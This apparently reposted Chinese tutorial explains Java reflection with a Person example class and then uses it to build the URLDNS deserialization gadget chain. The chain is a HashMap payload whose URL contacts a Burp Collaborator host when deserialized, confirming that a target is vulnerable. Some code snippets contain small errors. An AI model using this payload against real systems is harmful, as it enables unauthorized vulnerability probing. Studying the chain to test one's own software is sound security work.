<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/oC1MW7nT5K6xyFLCjq9jvA)

反射是大多数语言里都必不不可少的组成部分，对象可以通过反射获取他的类，类可以通过反射拿到所有方法（包括私有），拿到的方法可以调用，总之通过 “反射”，我们可以将 Java 这种静态语言附加上动态特性。

什么是反射

java 的反射是指在运行状态中，对于任意一个类都能够知道这个类所有的属性和方法，并且对于任意一个对象。

基本形式

```
public void execute(String className, String methodName) throws Exception {
Class clazz = Class.forName(className);
clazz.getMethod(methodName).invoke(clazz.newInstance());
}
```

上面的例子中，我演示了几个在反射里极为重要的方法：获取类的方法：forName 实例例化类对象的方法：newInstance 获取函数的方法：getMethod 执行函数的方法：invoke

反射的作用：

让 Java 具有动态性，修改已有对象的属性，动态生成对象，动态调用方法，操作内部类和私有方法

在反序列化漏洞中的应用

定制需要的对象，通过 invoke 调用除了同名函数以外的函数，通过 class 类创建对象，引入不能序列化的类

java 反射举例

此处引用白日梦组长的例子，具体讲解一下反射。

先写一个 Person 作为我们下面演示的原型类

```
public class Person {
    private String name;
    public int age;

    public void act(){
        System.out.println("test");
    }
    @Override
    public String toString() {
        return "Persion{" +
                " + name + '\'' +
                ", age=" + age +
                '}';
    }

    public String getName() {
        return name;
    }

    public void setName(String name) {
        this.name = name;
    }

    public int getAge() {
        return age;
    }

    public void setAge(int age) {
        this.age = age;
    }

    public Person() {
    }

    public Person(String name, int age) {
        this.name = name;
        this.age = age;
    }
}
```

获取原型类

使用 forName 方法

```
Class c = Class.forName("Person");
```

在此也写一种基于 ClassLoader 的动态类加载方式

```
this.getClass().getClassLoader().loadClass("Person");
```

从原型 class 里面实例化对象

利用构造函数实例化

```
Constructor constructor = c.getConstructor(String.class,int.class);
Person p1 = (Person) constructor.newInstance("abc",22);
```

我们来逐行写一下分析

```
Constructor constructor = c.getConstructor(String.class,int.class);
```

  
这一行是为了获取原型类中重载的构造方法  

```
public Person(String name, int age) {
           this.name = name;
           this.age = age;
}
```

  
对构造方法进行传参实例化一个对象  

```
Person p1 = (Person) constructor.newInstance("abc",22);
```

我们可以打印一下 p1 看一下返回结果

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LeyiaK6nPOjEaZrHu5rS1zfPXUjvmQryzlxUYiaE0dr8yHMBg2vAenjLcgKWiabA0qxTtIFY65CxfNLw/640?wx_fmt=png)

获取类里面的属性

```
private String name;
public int age;
```

public

```
Field ageField = c.getField("age");
ageField.set(p1,11);
```

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LeyiaK6nPOjEaZrHu5rS1zfP7C9U1D4ZojM10ZOdziczjdZhhx4Dpep1BvAMVlv4cib8yHHlrgGBr8Vw/640?wx_fmt=png)

private

```
Field nameField = c.getDeclaredField("name");
nameField.setAccessible(true);
nameField.set(p1,"xinyuan");
```

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LeyiaK6nPOjEaZrHu5rS1zfPMsaHsMd2n08nXGUTFwiaicXWGibApiaXib6mC5vvuyTe5P5dArVjKA8ZicPg/640?wx_fmt=png)

获取类方法

Method actmethod = c.getMethod("act",String.class);  
actmethod.invoke(p1,"SKyMirror");

getMethod 与上面的获取构造函数类似，第一个参数是函数名，第二个是传参的类型

invoke 方法第一个传入对象，第二个是传入参数值

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LeyiaK6nPOjEaZrHu5rS1zfPk8y0UDx0ETSd8AZAMFPbHSBaTLrRucn5O9o80csuL9icKNfibK2ebAUw/640?wx_fmt=png)

利用 URLDNS（反射）

这条链子算是反射的一个简单应用。

利用点

URL 这个类重写了 hashCode 方法，导致在执行 hashCode 的时候，此利用点不能命令执行，但是会请求 DNS，所以被用来验证是否存在反序列化漏洞。

源码如下：

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LeyiaK6nPOjEaZrHu5rS1zfPE6wt5CPHhgVUo3Bia6uaAbFpKUWl3D23EBx3ibry7BAeuk81XTPsC7yQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LeyiaK6nPOjEaZrHu5rS1zfPNDRibCx70fz3RppYicW6VAh4uKvAIz9kACnp7WvmUOSNdbHZ1icwwCXYg/640?wx_fmt=png)

可以看到当我们调用一次 hashCode 方法，他会对传进去的 URL 对象发起请求，即我们如果去 DNSLOG 申请一个地址，根据访问来判断是否成功执行了 hashCode 方法进而判断是否执行了反序列化的操作。

URL 这个类实现了 java.io.Serializable，可以进行序列化的操作。

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LeyiaK6nPOjEaZrHu5rS1zfPWjeYY66tmpUuwAudDjxUiaEibQMNlAKGPBl6OdCfjzrdm5mU79xdmH5g/640?wx_fmt=png)

因此，在这里我们可以验证一下我们上面的想法。

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LeyiaK6nPOjEaZrHu5rS1zfPY5jXAGUhzQxPQwqHfqwSwgfyr0Z9gl40bQaTOibB3tRFwAXHsuYA1KQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LeyiaK6nPOjEaZrHu5rS1zfPYPg0126Tx6m9POYH94pZ3BWPG8NCkmmVuGFicIGueEdYKX054swFRibQ/640?wx_fmt=png)

链子

这个链子也比较短，比较简单，主要是利用 HashMap 来执行 hashCode 方法

HashMap 实现了 Serializable 可以序列化，此处注意反序列化时 HashMap 的 readObject 方法

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LeyiaK6nPOjEaZrHu5rS1zfPm1N7fv1eJUE5kV2v9nOq4NnWgApbMo8iafGqWkJiafib9uI72S8jctS8A/640?wx_fmt=png)

我们跟进一下 hash 方法

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LeyiaK6nPOjEaZrHu5rS1zfPnxkibMMTmS3oyHxmflibCMic2huedXBYTtN7VmibNDBj6icCQQoBRZIQicJA/640?wx_fmt=png)

key 参数可控，key 又是由反序列化的时候生成的。在 HashMap 中用 put 传入一个 URL 的对象，即可在反序列化的时候调用到此方法，从而触发整个链子。

有一点需要注意，我们在序列化的时候，进行的 put 传参会修改掉传入的 URL 对象的 hashCode 的值，因为 hashCode 值不等于 - 1，从而导致无法正常触发下面的方法，即无法触发 DNS 请求。

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LeyiaK6nPOjEaZrHu5rS1zfPVXTuewMW9UrEf3lJAKCJGFVj4u0hLR5864V6YlxMcfylYGowR7s4kQ/640?wx_fmt=png)

同时在正常 put 传参的时候会执行一次 DNS 请求，所以我们在 put 传参之前修改 hashCode 的值（不为 - 1 就行），传参之后修改 hashCode 为 - 1，在反序列化的时候就可以正常执行了。

payload 如下

```
public static void main(String[] args) throws Exception{
HashMaphashMap = new HashMap<>();
URL u = new URL("http://i2loelbsvarbmabqf89qi9k88zep2e.burpcollaborator.net/");
Class c = u.getClass();
//在进行put方法传参之前修改URL对象的hashCode值
Field hashcodeField = c.getDeclaredField("hashCode");
hashcodeField.setAccessible(true);
hashcodeField.set(u,123);

hashMap.put(u,123);
//修改URL对象的hashCode值为-1
hashcodeField.set(u,-1);
serialize(hashMap);
}
```

**原创稿件征集**

征集原创技术文章中，欢迎投递

投稿邮箱：edu@antvsion.com

文章类型：黑客极客技术、信息安全热点安全研究分析等安全相关

通过审核并发布能收获 200-800 元不等的稿酬。

[更多详情，点我查看！](http://mp.weixin.qq.com/s?__biz=MjM5MTYxNjQxOA==&mid=2652885477&idx=1&sn=39e97a60d7b68d19569284654e74ffa1&chksm=bd59ad288a2e243e4d89b7c456fbd44a93d241c881075b342af22431d93dca56e52076ed75ce&scene=21#wechat_redirect)

![](https://mmbiz.qpic.cn/mmbiz_gif/7QRTvkK2qC6iavic0tIJIoZCwKvUYnFFiaibgSm6mrFp1ZjAg4ITRicicuLN88YodIuqtF4DcUs9sruBa0bFLtX59lQQ/640?wx_fmt=gif&wxfrom=5&wx_lazy=1)

限时免费靶场实操，戳 “阅读原文 “